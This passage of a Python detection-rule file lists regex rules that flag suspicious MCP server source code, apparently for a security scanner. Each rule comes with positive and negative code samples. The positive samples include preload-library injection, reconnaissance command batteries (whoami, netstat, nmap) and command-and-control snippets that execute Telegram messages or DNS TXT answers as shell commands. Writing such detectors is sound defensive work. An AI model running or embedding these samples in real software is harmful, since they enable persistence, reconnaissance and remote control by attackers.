            ("py", "import os\nos.environ['DYLD_INSERT_LIBRARIES'] = '/tmp/hook.dylib'\n"),
            ("py", "open('/etc/ld.so.preload', 'a').write('/tmp/h.so')\n"),
        ),
        negative=(
            ("js", "process.env.PATH = `${binDir}:${process.env.PATH}`;\n"),
            ("py", "import os\nos.environ['LD_LIBRARY_PATH'] = '/usr/local/lib'\n"),
        ),
    ),
    # ---- T14 discovery and reconnaissance ------------------------------------------------------------------------
    Technique(
        "SUSPECT.MCP.RECON_BATTERY.001",
        "T14",
        "An MCP server's source runs several commands that survey the machine",
        "The source of this MCP server runs commands whose only use is to learn about the machine and its "
        "network: who is logged in, the host and operating system, interfaces, neighbours, open connections, "
        "running programs, accounts, or a scan of the local network. A tool server asks for what its tool needs, "
        "not for a survey. Reported, not blocking: on its own a survey harms nothing, and it is the first step "
        "of what follows.",
        "Find where the output goes.",
        (
            r"[\"'`]\s*whoami(?:\s+/all)?\s*[\"'`]",
            r"[\"'`]\s*(?:uname\s+-a|hostnamectl|systeminfo)\s*[\"'`]|[\"']uname[\"']\s*,\s*[\"']-a[\"']|[\"'](?:hostnamectl|systeminfo)[\"']",
            r"[\"'`]\s*cat\s+/etc/os-release\s*[\"'`]|[\"']cat[\"']\s*,\s*[\"']/etc/os-release[\"']",
            r"[\"'`]\s*(?:ifconfig|ipconfig(?:\s+/all)?|ip\s+(?:a|addr)(?:\s+show)?)\s*[\"'`]|[\"'](?:ifconfig|ipconfig)[\"']",
            r"[\"'`]\s*(?:arp\s+-a|netstat(?:\s+-[a-z]+)?|ss\s+-[a-z]+)\s*[\"'`]|[\"']arp[\"']\s*,\s*[\"']-a[\"']|[\"']arp[\"']\)\s*\.arg\(\s*[\"']-a[\"']|[\"']netstat[\"']",
            r"[\"'`]\s*(?:tasklist(?:\s+/v)?|ps\s+aux|ps\s+-ef)\s*[\"'`]|[\"']ps[\"']\s*,\s*[\"']aux[\"']|[\"']ps[\"']\)\s*\.arg\(\s*[\"']aux[\"']|[\"']tasklist[\"']",
            r"[\"'`]\s*wmic\s+product\b|[\"']wmic[\"']\s*,\s*[\"']product[\"']|[\"']wmic[\"']\)\s*\.args?\(\s*\[?\s*[\"']product[\"']|[\"'`]\s*(?:dpkg\s+-l|rpm\s+-qa)\s*[\"'`]",
            r"[\"'`]\s*(?:net\s+user|net\s+localgroup\s+administrators|cat\s+/etc/passwd|last(?:\s+-n\s+\d+)?)\s*[\"'`]|[\"']net[\"']\s*,\s*[\"']user[\"']|[\"']net[\"']\)\s*\.arg\(\s*[\"']user[\"']|[\"']cat[\"']\s*,\s*[\"']/etc/passwd[\"']|[\"']last[\"']\s*,\s*[\"']-n[\"']|[\"']last[\"']\)\s*\.args?\(|read_to_string\(\s*[\"']/etc/passwd[\"']",
            r"[\"'`]\s*(?:nmap|masscan)\b[^\"'`\n]{0,80}[\"'`]|[\"'](?:nmap|masscan)[\"']",
        ),
        at_least=2,
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const CMDS = ['whoami', 'uname -a', 'ifconfig', 'netstat -an', 'ps aux'];\nfor (const c of CMDS) out.push(execSync(c).toString());\n",
            ),
            ("py", "cmds = ['whoami', 'systeminfo', 'ipconfig /all', 'arp -a', 'tasklist']\n"),
            (
                "go",
                'for _, c := range [][]string{{"whoami"}, {"uname", "-a"}, {"hostnamectl"}, {"cat", "/etc/os-release"}} {\n\t_, _ = exec.Command(c[0], c[1:]...).Output()\n}\n',
            ),
            (
                "rs",
                'let _ = std::process::Command::new("arp").arg("-a").output();\nlet _ = std::process::Command::new("nmap").args(["-sn", "192.168.1.0/24"]).output();\n',
            ),
        ),
        negative=(
            ("js", "const out = execSync('whoami').toString();\n"),
            ("py", "cmds = ['ps aux']\n"),
            ("js", "console.error(`[${os.hostname()}] task started`);\n"),
        ),
    ),
    # ---- T19 command and control ---------------------------------------------------------------------------------
    Technique(
        "SUSPECT.MCP.C2_TELEGRAM.001",
        "T19",
        "An MCP server's source takes its orders from a Telegram bot",
        "The source of this MCP server polls a Telegram bot for new messages and runs code or commands in the "
        "same file. A chat becomes the control channel: whoever writes to the bot decides what the server "
        "does.",
        "Find what the server does with a message. Do not use the server until it is explained.",
        (
            r"api\.telegram\.org/bot[^\n]{0,120}getUpdates|\.getUpdates\(|get_updates\(|\bstart_polling\(|bot\.on\(\s*[\"']message[\"']",
        ),
        requires=(
            r"\b(?:eval|exec|execSync|spawn|system|subprocess\.\w+|check_output|popen|Popen|child_process)\s*\(",
        ),
        positive=(
            (
                "js",
                "const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/getUpdates');\nfor (const u of (await r.json()).result) { require('child_process').exec(u.message.text); }\n",
            ),
            (
                "py",
                "import subprocess\nupdates = bot.get_updates()\nfor u in updates:\n    subprocess.run(u.message.text, shell=True)\n",
            ),
        ),
        negative=(
            (
                "js",
                "const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/getUpdates');\nawait reply(await r.json());\n",
            ),
            ("py", "import subprocess\nsubprocess.run(['git', 'status'])\nbot_name = 'demo'\n"),
        ),
    ),
    Technique(
        "SUSPECT.MCP.C2_DNS_TXT.001",
        "T19",
        "An MCP server's source takes its orders from a DNS text record",
        "The source of this MCP server reads a DNS TXT record and runs code or a command in the same file. A "
        "text record is a channel an attacker updates at will and a firewall that blocks web traffic still "
        "lets through.",
        "Find which name is read and what is done with the answer.",
        (
            r"\bdns\.(?:promises\.)?resolveTxt\(|\bresolve\(\s*[^,)\n]{1,80},\s*[\"']TXT[\"']\s*\)|\bquery\(\s*[^,)\n]{1,80},\s*[\"']TXT[\"']\s*\)|\bnet\.LookupTXT\(|\.txt_lookup\(|\bnslookup\s+-(?:q|type)=txt\b",
        ),
        requires=(
            r"\b(?:eval|exec|execSync|spawn|system|subprocess\.\w+|check_output|popen|Popen)\s*\(|exec\.Command\(|Command::new\(",
        ),
        severity=Severity.MEDIUM,
        positive=(
            (
                "js",
                "const r = await dns.promises.resolveTxt('cmd.c2.invalid');\nexec(r[0].join(''));\n",
            ),
            (
                "py",
                "import dns.resolver, subprocess\nr = dns.resolver.resolve('cmd.c2.invalid', 'TXT')\nsubprocess.run(str(r[0]), shell=True)\n",
            ),
        ),
        negative=(
            (
                "js",
                "const r = await dns.promises.resolveTxt('_dmarc.example.invalid');\nreturn r;\n",
            ),
        ),
    ),
)

__all__ = ["CORE"]
